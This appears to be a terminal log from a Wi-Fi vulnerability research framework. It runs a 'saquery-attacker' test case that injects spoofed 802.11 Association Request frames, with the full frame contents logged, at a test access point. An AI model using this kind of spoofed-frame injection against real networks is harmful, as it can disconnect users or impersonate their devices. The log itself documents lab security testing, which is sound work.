~/Desktop/wifi-vulnerabilities-analysis/queue-security-context/wifi-framework (main*) » sudo "$(which python)" ./run.py wlp0s20f3 test-queue-saquery-attacker
[17:38:33] Using interface monwlp0s20f3 (iwlwifi) to inject frames.
[17:38:33] Starting daemon using: ./dependencies/hostap_2_10/wpa_supplicant/wpa_supplicant -Dnl80211 -i wlp0s20f3 -c ./setup/supplicant.conf -W -K
Successfully initialized wpa_supplicant
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
nl80211: kernel reports: Match already configured
[17:38:33] Trigger = NoTrigger.
[17:38:33] Generating test-queue-saquery-attacker test case.
[17:38:33] Injecting frame 1 with spoofed MAC: a0:51:0b:65:8e:71
[17:38:33] Injecting frame 2 with spoofed MAC: a0:51:0b:65:8e:71
[17:38:33] Listening for AP response (20 seconds)...
[17:38:33] Disabled automatic network scanning
[17:38:35] ======================================================================
[17:38:35] TARGET AP BSSID: 06:86:f4:50:c8:18
[17:38:35] TARGET AP SSID: testnetwork-samsung
[17:38:35] SPOOFED MAC: a0:51:0b:65:8e:71
[17:38:35] ======================================================================
[17:38:35] Starting injection attack...
[17:38:36] Injected <Dot11  subtype=Association Request type=Management FCfield=pw-mgt addr1=06:86:f4:50:c8:18 (RA=DA) addr2=a0:51:0b:65:8e:71 (TA=SA) addr3=06:86:f4:50:c8:18 (BSSID/STA) |<Dot11AssoReq  |<Dot11Elt  ID=SSID info=b'testnetwork-samsung' |<Dot11Elt  ID=Supported Rates info=b'\x02\x04\x0b\x16\x0c\x12\x18$' |<Dot11Elt  ID=Extended Supported Rates info=b'0H`l' |<Raw  load=b'0\x1a\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x08\xc0\x00\x00\x00\x00\x0f\xac\x06' |>>>>>>
[17:38:38] Injected <Dot11  subtype=Association Request type=Management addr1=06:86:f4:50:c8:18 (RA=DA) addr2=a0:51:0b:65:8e:71 (TA=SA) addr3=06:86:f4:50:c8:18 (BSSID/STA) |<Dot11AssoReq  |<Dot11Elt  ID=SSID info=b'testnetwork-samsung' |<Dot11Elt  ID=Supported Rates info=b'\x02\x04\x0b\x16\x0c\x12\x18$' |<Dot11Elt  ID=Extended Supported Rates info=b'0H`l' |<Raw  load=b'0\x1a\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x08\xc0\x00\x00\x00\x00\x0f\xac\x06' |>>>>>>